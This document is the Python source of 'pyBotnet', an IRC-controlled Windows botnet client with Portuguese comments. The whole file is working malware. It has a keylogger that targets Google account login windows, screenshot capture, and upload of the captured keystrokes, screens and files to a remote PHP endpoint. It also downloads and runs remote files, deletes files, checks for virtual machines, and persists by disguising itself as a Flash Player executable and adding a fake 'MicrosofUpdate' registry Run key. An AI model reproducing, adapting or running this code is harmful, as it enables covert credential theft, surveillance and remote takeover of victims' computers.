#!/usr/bin/python
#-*- coding: utf-8 -*-
# pyBotnet v1.0 
# author msOliver
# creation date: 17/03/2016
# Social media:  https://www.facebook.com/msoliveroriginal
# Youtube Channel: https://www.youtube.com/channel/UCp9cDi1ibw7D8bjFMm6BZHQ
import sys
import os
import socket # Para a funcao conn(): && ipLocal():
import platform # Para pegar o nome do computador variavel pcName
import random # Para adicionar numeros aleatorios para variavel pcName
import glob # Para a funcao listFile(): listar arquivos no computador
import re # Para a funcao getPublicIp(): Ip Location
from urllib import urlopen # Para a funcao getPublicIp(): Ip Location
import requests # Para a funcao upload(): Upload Arquivos
import urllib,urllib2 # Para a funcao download(): download de arquivos via http
import subprocess # Para a funcao run(): para execultar programa
import Image, ImageGrab, time, datetime # Para funcao screenshot(): printscreen - print tela
import shutil # Para a funcao startup(): copia o server para um diretorio
from _winreg import * # Para a funcao startup(): gravar no regedit
import win32com.client # Para a funcao vmDetect()
import pythoncom, pyHook, win32api, win32gui, win32con # Para a função Keylogger
from threading import Timer # Para a função Keylogger
from threading import Thread # Para a função Keylogger
#from allimport import *
ircServer= "chat.freenode.net"	# Address Server Irc
ircChanne= "#pythonbrs"			# Channel for Bot connect
ircPwdCha= ""					# Password of Channel, if there enter the password or leave blank
botAdmi= "msOliver"				# A name for the welcome help, Not obligatory.
botPass= "12345"				# Not obligatory. A name for the welcome help
dir = "C:\\Users\\Public\\Libraries\\adobeflashplayer.exe" 			# Path to where the bot will copy + name it, Use \ double to separate directories: \\
urlFromUpload = "http://www.site.com.br/site/wp-cont/upload.php" 	# URL that contains the php ARRAY to receive files via upload
urlFromUpShow = urlFromUpload.strip('http:upload.php')				# Variable that receives the URL to display uploaded files
# keylogging function
# originally by: Technic Dynamic, http://www.technicdynamic.com/
#############################
# only working for Windows.	#
activeScreenshot = 0 		# set to True to take screenshot(s)
numScreenshot = 3			# set amount of screenshot to take.
numInterScreen = 1.6		# interval between each screenshot.
getWindowTexTitle = ''		#
logScreen = []				# this list contains matches for taking automated screenshots...
logScreen.append("Contas do Google")
#logScreen.append("Facebook") # for example, if it finds "Facebook" in titlebar..
#logScreen.append("Sign In")
logState = False
logTime = 20
logText = ""
mainThreadId = win32api.GetCurrentThreadId()
def Keylog():
	# only supported for Windows at the moment...
	if os.name != 'nt': return "Not supported for this operating system.\n"
	global logText, logState, getWindowTexTitle, mainThreadId, urlFromUpload, urlFromUpShow
	logState = True # begin logging!
	mainThreadId = win32api.GetCurrentThreadId()
	# add timestamp when it starts...
	logText += "\n===================================================\n"
	logDate = datetime.datetime.now()
	logText += ' ' + str(logDate) + ' >>> Keylogger Inicializado.. |\n'
	logText += "===================================================\n\n"
	# find out which window is currently active!
	w = win32gui
	getWindowTexTitle = w.GetWindowText (w.GetForegroundWindow())
	logDate = datetime.datetime.now()
	logText += "[*] Janela ativada. [" + str(logDate) + "] \n"
	logText += "=" * len(getWindowTexTitle) + "===\n"
	logText += " " + getWindowTexTitle + " |\n"
	logText += "=" * len(getWindowTexTitle) + "===\n\n"
	t = Timer(float(logTime), stopKeylog) # Quit
	t.start()
	# open file to write
	logDataFile = open(logFileName, 'wb')
	hm = pyHook.HookManager()
	hm.KeyDown = OnKeyboardEvent
	hm.HookKeyboard()
	pythoncom.PumpMessages() # this is where all the magic happens! ;)
	# after finished, we add the timestamps at the end.
	logText += "\n\n===================================================\n"
	logDate = datetime.datetime.now()
	logText += " " + str(logDate) + ' >>> Keylogger Finalizado. |\n'
	logText += "===================================================\n"
	logState = False
	logDataFile.write(logText)
	logDataFile.close()
	sendMsg(ircChanne, "..::Captura de teclas finalizada para " + str(logFileName) + " em " + str(logTime) + " segundos...")
	sendMsg(ircChanne, "..:: Aguarde "+ str(logFileName) +" sendo urpada::..")
	files = {'file': open(logFileName, 'rb')}
	r = requests.post(urlFromUpload, files=files) #import requests
	sendMsg(ircChanne, "..::"+ logFileName +" urpado com sucesso para::.. http:"+urlFromUpShow + logFileName)
def stopKeylog():
    win32api.PostThreadMessage(mainThreadId, win32con.WM_QUIT, 0, 0); # this function actually records the strokes.
def OnKeyboardEvent(event):
	global logState
	# return is it isn't logging.
	if logState == False: return True
	global logText, getWindowTexTitle, numInterScreen, activeScreenshot, numScreenshot
	# check for new window activation
	wg = win32gui
	logNewActive = wg.GetWindowText (wg.GetForegroundWindow())
	if logNewActive != getWindowTexTitle:
		# record it down nicely...
		logDate = datetime.datetime.now()
		logText += "\n\n[*] Janela Ativada. [" + str(logDate) + "] \n"
		logText += "=" * len(logNewActive) + "===\n"
		logText += " " + logNewActive + " |\n"
		logText += "=" * len(logNewActive) + "===\n\n"
		getWindowTexTitle = logNewActive
		# take screenshots while logging!
		if int(activeScreenshot) == 1:
			logImg = 0
			while logImg < len(logScreen):
				if logNewActive.find(logScreen[logImg]) > 0:
					logText += "[*] " + str(numScreenshot) + " captura de tela  para \"" + logScreen[logImg] + "\" .\n\n"
					ss = Thread(target=takeScreenshots, args=(logScreen[logImg],numScreenshot,numInterScreen))
					ss.start()
				logImg += 1
	if event.Ascii == 8: logText = logText[:-1]
	elif event.Ascii == 13 or event.Ascii == 9: logText += "\n"
	else: logText += str(chr(event.Ascii))	
	return True
def takeScreenshots(i, maxShots, intShots):
	shot = 0
	shottime = time.strftime('%Y_%m_%d_%H_%M_%S')
	while shot < maxShots:
		oneScreenshots()
		time.sleep(intShots)
		shot += 1	
def startup():
    shutil.copy(sys.argv[0],dir)
    aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
    aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
    SetValueEx(aKey,"MicrosofUpdate",0, REG_SZ, dir)	
def infoBot():
# REFERENCIA http://www.activexperts.com/admin/scripts/wmi/python/0384/
	global A, B, C, D, E, F, G, H
	mnfo = platform.uname()
	os = platform.system()
	name = platform.node()
	proc = platform.processor()
	strComputer = "."
	objWMIService = win32com.client.Dispatch("WbemScripting.SWbemLocator")
	objSWbemServices = objWMIService.ConnectServer(strComputer,"root\cimv2")
	colItems = objSWbemServices.ExecQuery("SELECT * FROM Win32_ComputerSystemProduct")
	for objItem in colItems:
		if objItem.Caption != None:
			A = objItem.Caption
		if objItem.Description != None:
			B =  objItem.Description
		if objItem.IdentifyingNumber != None:
			C =  objItem.IdentifyingNumber
		if objItem.Name != None:
			D = objItem.Name
		if objItem.SKUNumber != None:
			E =  objItem.SKUNumber
		if objItem.UUID != None:
			F = objItem.UUID
		if objItem.Vendor != None:
			G = objItem.Vendor
		if objItem.Version != None:
			H = objItem.Version
	sendMsg(ircChanne, "Titulo: " + str(A))
	time.sleep(1)
	sendMsg(ircChanne, "Descricao: " + str(B))
	time.sleep(1)
	sendMsg(ircChanne, "Numero de identificacao: " + str(C))
	time.sleep(1)
	sendMsg(ircChanne, "Nome: " + str(D))
	time.sleep(1)
	#sendMsg(ircChanne, "Numero SKU: " + str(E))
	#time.sleep(1)
	sendMsg(ircChanne, "UUID: " + str(F))
	time.sleep(1)
	sendMsg(ircChanne, "Fornecedor: " + str(G))
	time.sleep(1)
	sendMsg(ircChanne, "Versao: " + str(H))
	time.sleep(1)	
	sendMsg(ircChanne, "Sistema Operacional: " + str(os))
	time.sleep(1)
	sendMsg(ircChanne, "Nome do Computador: " + str(name))
	time.sleep(1)
	sendMsg(ircChanne, "Processador: " + str(proc))
	time.sleep(1)
	sendMsg(ircChanne, str(mnfo))
def delLogTxt():
	txt = glob.glob('*.txt')
	for txt in txt:
		os.unlink(txt)
	sendMsg(ircChanne, "Removendo logs de capturas de teclas... ")
def delLogPic():
	pic = glob.glob('*.png')
	for pic in pic:
		os.unlink(pic)
	sendMsg(ircChanne, "Removendo logs de capturas de imagems...")
def delFileY():
	localisfile = glob.glob(delFile)
	if os.path.exists(delFile):
		for localisfile in localisfile:
			os.unlink(localisfile)
			sendMsg(ircChanne, "Arquivo deletado  " + "[ " + localisfile + " ]")
	else:
		sendMsg(ircChanne, "O arquivo nao existe " + "[ " + delFile + " ]")
def oneScreenshots():# screenshot function
# originally by: Technic Dynamic, http://www.technicdynamic.com/
	global saveas, urlFromUpload, urlFromUpShow
	img=ImageGrab.grab()
	saveas=os.path.join(time.strftime('%Y_%m_%d_%H_%M_%S')+'.png')
	img.save(saveas)
	sendMsg(ircChanne,  "..::Screenshot salvo::.. " + str(saveas) +  " ..:: Aguarde imagem sendo urpada::..")
	#url = 'http://www.site.com.br/site/wp-cont/upload.php' #Arry Receber o arquivo 
	files = {'file': open(saveas, 'rb')}
	r = requests.post(urlFromUpload, files=files) #import requests
	sendMsg(ircChanne, "..::Imagem urpado com sucesso para::.. http:"+urlFromUpShow + saveas)
def multipleScreenshots():
# originally by: Technic Dynamic, http://www.technicdynamic.com/
# take multiple screenshots function
# args = number of shots, interval between shots
	shot = 0
	shottime = time.strftime('%Y_%m_%d_%H_%M_%S')
	while shot < float(maxPic):
		oneScreenshots()
		time.sleep(float(interval))
		shot += 1	
def run():
	if os.path.isfile(str(fileRun)) == True:
		subprocess.call(['start', fileRun], shell=True)
		sendMsg(ircChanne, fileRun + " execultado com sucesso.")
	else:
		sendMsg(ircChanne, fileRun + " arquivo nao existe.")
def download():
#REFERENCIA http://stackoverflow.com/questions/1096379/how-to-make-urllib2-requests-through-tor-in-python
	if urlDown.find("http://")!= -1:
		file_name = urlDown.split('/')[-1]
		u = urllib2.urlopen(urlDown)
		f = open(file_name, 'wb')
		meta = u.info()
		file_size = int(meta.getheaders("Content-Length")[0])
		sendMsg(ircChanne, "Downloading: %s - Tamanho: %s Bytes" % (file_name, file_size))
		f.write(u.read())
		f.close()
		sendMsg(ircChanne, "Download completo de: " + str(file_name))
	else:
		sendMsg(ircChanne, "Atencao: Falta [ http:// ] na url " + urlDown)
def upload():
	#url = 'http://www.site.com.br/site/wp-cont/upload.php' #Arry Receber o arquivo
	global urlFromUpload, urlFromUpShow
	if os.path.exists(fileUp):
		files = {'file': open(fileUp, 'rb')}
		r = requests.post(urlFromUpload, files=files) #import requests
		#sendMsg(ircChanne, "..::Arquivo urpado com sucesso::.. para " + "http://www.site.com.br/site/wp-cont/" + fileUp)
		sendMsg(ircChanne, "..::Arquivo urpado com sucesso::.. para http:"+urlFromUpShow + fileUp)
	else:
		sendMsg(ircChanne, "O arquivo nao existe " + "[ " + fileUp + " ]")
def getPublicIp():
    data = str(urlopen('http://checkip.dyndns.com/').read())
    return re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(data).group(1)
def ipLocal():
	addresses = [ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1]   
	return addresses
def listFile():
	file = glob.glob('*.*')
	for file in file:
		sendMsg(ircChanne, "Arquivo: [ " + file + " " + str(os.path.getsize(file)) + " kb ]")
def vmDetect():
#REFERENCIA http://www.activexperts.com/admin/scripts/wmi/python/0384/
	strComputer = "."
	objWMIService = win32com.client.Dispatch("WbemScripting.SWbemLocator")
	objSWbemServices = objWMIService.ConnectServer(strComputer,"root\cimv2")
	colItems = objSWbemServices.ExecQuery("SELECT * FROM Win32_ComputerSystemProduct")
	for objItem in colItems:
		if objItem.Name != None:	
			VMNAME = objItem.Name
		if VMNAME == "VMware Virtual Platform":
			return 1
		if VMNAME == "VirtualBox":
			return 1
		if VMNAME == "Virtual PC":
			return 1
		else:
			return 0
def conn():
    try:
        ircSock.connect((ircServer, 6665 ))
    except socket.error:
        conn()
    else:
        ircSock.send(str.encode("useR "+ botNick +" "+ botNick +" "+ botNick +" :The Walking Dead\n"))
        ircSock.send(str.encode("NICK "+ botNick +"\n"))
def ping():
	ircSock.send (str.encode("PONG :pingis\n"))
def sendMsg(chan, msg):
	ircSock.send(str.encode("PRIVMSG " + chan +" :" + msg + "\n"))	
def join(chan):
	ircSock.send(str.encode("JOIN " + chan + " " + ircPwdCha + "\n"))
def leaveChannel(chan):
	ircSock.send(str.encode("PART " + chan + " leaving the canal" + "\n"))
def quitIrc(chan):
    ircSock.send(str.encode("QUIT" + "\n"))
def main():
	global botAdmi, dir, ircSock, botNick, fileUp, urlDown, fileRun, maxPic, interval, delFile, logTime, logFileName, activeScreenshot
	if vmDetect() == 0:#1:  # vmDetect , Verifica se o pc é uma maquina real ou virtual use 1 para detectar vms - 
		sys.exit()
	#if os.path.isfile(dir) == False:
	#    startup()
	#else:
	#	print "Erro"
	pcName = platform.node()
	ircSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	botNick = pcName + "-" + str(random.randint(1, 10000))
	#time.sleep(40) # Aguarda Inicialização da placa de rede
	conn()
	join(ircChanne)
	login = False
	while login != True:
		ircMsg = ircSock.recv(5000)
		ircMsgClean = ircMsg.strip(str.encode('\n\r'))
		ircSock.send(str.encode("NICK " + botNick + "\n"))
		print(ircMsgClean)
		if ircMsg.find(ircMsg.replace("PING ", "PONG")) !=-1:
			ping() 
		if ircMsg.find(str.encode("login")) !=-1:
			try:
				p = ircMsgClean.split()
				pwd = p[4]
			except IndexError:
				sendMsg(ircChanne, "..::Sintax Invalida::.. use: <login> <senha>")
			else:
				if pwd != botPass:
					sendMsg(ircChanne, "ERROR: Senha Invalida, ou voce nao pode logar")
				else:
					sendMsg(ircChanne, "..::Conectado::.. " + botNick)
					login = True
	while True:
		ircMsg = ircSock.recv(5000)
		ircMsgClean = ircMsg.strip(str.encode('\n\r'))
		print(ircMsgClean)
		if ircMsg.find(str.encode("Nickname is already in use")) != -1:
			botNick = pc_name + str(random.randint(1,10000))
			ircSock.send(str.encode("NICK "+ botNick +"\n"))
			join(ircChanne)
		if ircMsg.find(str.encode("PING :")) != -1:
			ping()		
		elif ircMsg.find(str.encode("leave")) != -1: # Command used for the bot leave the channel, but remains connected to the irc server
			leaveChannel(ircChanne)				
		elif ircMsg.find(str.encode("exit")) != -1: # Command used for kill bot on irc server
			quitIrc(ircChanne)
			sys.exit()
		elif ircMsg.find(str.encode("help")) != -1: # Command used to display help for the user
			try:
				p = ircMsgClean.split()
				id = p[4]
			except IndexError:
				sendMsg(ircChanne, "..::Sintax Invalida::.. use: <help> <" + botNick +">")
			else:
				if id == botNick:
					sendMsg(ircChanne, "!!- Bem Vindo -!! " + botAdmi)
					time.sleep(1)
					sendMsg(ircChanne, "use: [exit] para matar os bots ativos")
					time.sleep(1)
					sendMsg(ircChanne, "use: [leave] para os bots sair do canal")
					time.sleep(1)
					sendMsg(ircChanne, "use: [dir] para vizualizar o diretorio atual do bot")
					time.sleep(1)
					sendMsg(ircChanne, "use: [ls] para listar o conteudo da pasta atual")
					time.sleep(1)
					sendMsg(ircChanne, "use: [ip] para mostrar o ip da host")
					time.sleep(1)
					sendMsg(ircChanne, "use: [upload] para urpar arquivos")
					time.sleep(1)
					sendMsg(ircChanne, "use: [download] para baixar arquivos para o host")
					time.sleep(1)
					sendMsg(ircChanne, "use: [run] para executar um programa")
					time.sleep(1)
					sendMsg(ircChanne, "use: [screenshot] para tirar um foto da tela")
					time.sleep(1)
					sendMsg(ircChanne, "use: [multiscreens] para tirar multipla fotos da tela")
					time.sleep(1)
					sendMsg(ircChanne, "use: [delete] para deletar arquivos")
					time.sleep(1)
					sendMsg(ircChanne, "use: [info] mostras informacoes detalhada do computador")
					time.sleep(1)
					sendMsg(ircChanne, "use: [keylogger] para inicializar captura de teclas")
					time.sleep(1)
					sendMsg(ircChanne, "use: [blank] 0000000")
					time.sleep(1)
					sendMsg(ircChanne, "use: [blank] 0000000")
					time.sleep(1)
					sendMsg(ircChanne, "use: [blank] 0000000")
		elif ircMsg.find(str.encode("botnick")) != -1: # Command to get bot nickname
			sendMsg(ircChanne, "Nickname: " + botNick)		
		elif ircMsg.find(str.encode("dir")) != -1: # Command to list the current directory of the bot
			try:
				p = ircMsgClean.split()
				id = p[4]
			except IndexError:
				sendMsg(ircChanne, "..::Sintax Invalida::.. use: <dir> <" + botNick +">")
			else:
				if id == botNick:
					sendMsg(ircChanne, "Diretorio atual do bot: " + sys.path[0])	
		elif ircMsg.find(str.encode("ls")) != -1: # Command to list the files in the current directory
			try:
				p = ircMsgClean.split()
				id = p[4]
			except IndexError:
				sendMsg(ircChanne, "..::Sintax Invalida::.. use: <ls> <" + botNick +">")
			else:
				if id == botNick:
					listFile()
		elif ircMsg.find(str.encode("ip")) != -1: # Command to get the host IP
			try:
				p = ircMsgClean.split()
				id = p[4]
			except IndexError:
				sendMsg(ircChanne, "..::Sintax Invalida::.. use: <ip> <" + botNick +">")
			else:
				if id == botNick:
					yx = getPublicIp()
					xy = ipLocal()
					sendMsg(ircChanne, "IP Local: " + str(xy) +  " Ip Externo: " + "['" + yx + "']"  )	
		elif ircMsg.find(str.encode("upload")) != -1: # Command to upload files
			try:
				p = ircMsgClean.split()
				fileUp = p[4]
				id = p[5]
			except IndexError:
				sendMsg(ircChanne, "..::Sintax Invalida::.. use: <upload> <Arquivo> <" + botNick +">")
			else:
				if fileUp == fileUp and id == botNick:
					sendMsg(ircChanne, "..::Aguarde Arquivo sendo urpado::..")
					upload()
		elif ircMsg.find(str.encode("download")) != -1: # Command to download files to the host
			try:
				p = ircMsgClean.split()
				urlDown = p[4]
				id = p[5]
			except IndexError:
				sendMsg(ircChanne, "..::Sintax Invalida::.. use: <download> <link> <" + botNick +">")
				#sendMsg(ircChanne,  "use: <download> <link> <" + botNick +">")
			else:
				if urlDown == urlDown and id == botNick:
					download()
		elif ircMsg.find(str.encode("run")) != -1: # Command to execute files on the host
			try:
				p = ircMsgClean.split()
				fileRun = p[4]
				id = p[5]
			except IndexError:
				sendMsg(ircChanne, "..::Sintax Invalida::.. use: <run> <programa> <" + botNick +">")
			else:
				if fileRun == fileRun and id == botNick:
					run()
		elif ircMsg.find(str.encode("screenshot")) != -1: # Command to take a screenshot of the host
			try:
				p = ircMsgClean.split()
				id = p[4]
			except IndexError:
				sendMsg(ircChanne, "..::Sintax Invalida::.. use: <screenshot> <" + botNick +">")
			else:
				if id == botNick:
					oneScreenshots()
					time.sleep(2)
					delLogPic()				
		elif ircMsg.find(str.encode("multiscreens")) != -1: # Command to take multiple screenshots
			try:
				p = ircMsgClean.split()
				maxPic = p[4]
				interval = p[5]
				id = p[6]
			except IndexError:
				sendMsg(ircChanne, "..::Sintax Invalida::.. use: <multiscreens> <quantidade> <intervalo> <" + botNick +">")
			else:
				if maxPic == maxPic and interval == interval and id == botNick:
					multipleScreenshots()
					time.sleep(2)
					delLogPic()
		elif ircMsg.find(str.encode("delete")) != -1: # Command to delete files
			try:
				p = ircMsgClean.split()
				delFile = p[4]
				id = p[5]
			except IndexError:
				sendMsg(ircChanne, "..::Sintax Invalida::.. use: <delete> <arquivo> <" + botNick +">")
			else:
				if delFile == delFile and id == botNick:
					delFileY()
		elif ircMsg.find(str.encode("info")) != -1: # Command to get information from the computer
			allBots = "bots"
			try:
				p = ircMsgClean.split()
				id = p[4]
			except IndexError:
				sendMsg(ircChanne, "..::Sintax Invalida::.. use: <info> <bots> ou <info> <" + botNick +">")
			else:
				if id == botNick or id == allBots:
					infoBot()				
		elif ircMsg.find(str.encode("keylogger")) != -1: # Command to activate keyboard capture
			try:
				p = ircMsgClean.split()
				logTime = p[4]
				logFileName = p[5]
				activeScreenshot = p[6]
				id = p[7]
			except IndexError:
				sendMsg(ircChanne, "..::Sintax Invalida::.. use: <keylogger> <tempo> <arquivo> <0/1 print> <"+botNick+">")
			else:
				if logTime == logTime and logFileName == logFileName and activeScreenshot == activeScreenshot and id == botNick:
					sendMsg(ircChanne, "..::Keylogger Iniciado::..")
					Keylog()
					time.sleep(2)
					delLogTxt()
					time.sleep(2)
					delLogPic()
if __name__ == "__main__":
	main()	